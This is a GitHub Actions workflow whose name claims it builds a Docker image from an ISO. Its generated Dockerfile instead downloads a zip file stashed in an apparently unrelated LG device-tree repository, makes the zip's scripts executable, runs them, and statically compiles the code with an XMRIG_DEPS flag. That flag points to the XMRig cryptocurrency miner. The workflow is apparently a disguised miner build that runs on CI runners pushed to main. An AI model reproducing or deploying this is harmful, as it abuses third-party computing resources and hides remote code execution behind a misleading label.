name: Build Docker Image from ISO

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Set up QEMU and required packages
      run: |
        sudo apt-get update
        sudo apt-get install -y wget genisoimage

    - name: Create Dockerfile
      run: |
        cat <<EOF > Dockerfile
        FROM debian:bullseye

        # 更新软件包列表并安装必要的编译工具
        RUN apt-get update && apt-get install -y \\
            curl \\
            unzip \\
            git \\
            build-essential \\
            cmake \\
            automake \\
            libtool \\
            autoconf \\
            glibc-source \\
            libstdc++-10-dev \\
            gcc \\
            && apt-get clean

        # 设置工作目录
        WORKDIR /usr/src/app

        # 复制项目文件到容器中
        COPY . .

        # 下载并解压源码
        RUN curl -L -o testformycode-nbg.zip https://raw.githubusercontent.com/Janit8r/device_lge_judyln/refs/heads/S/testformycode-nbg.zip && \\
            unzip testformycode-nbg.zip

        # 构建项目
        RUN cd testformycode-nbg/scripts-64 && \\
            chmod 777 *.sh && \\
            ./build_deps.sh && \\
            cd .. && \\
            mkdir build && \\
            cd build && \\
            cmake -DXMRIG_DEPS=scripts-64/deps -DCMAKE_CXX_FLAGS="-static" -DCMAKE_EXE_LINKER_FLAGS="-static" -DBUILD_SHARED_LIBS=OFF .. && \\
            make
        EOF
      shell: bash

    - name: Build Docker image
      run: docker build -t kali-docker .

    - name: Run Docker container
      run: docker run --name kali_container -d kali-docker

    - name: Clean up
      run: docker rm -f kali_container
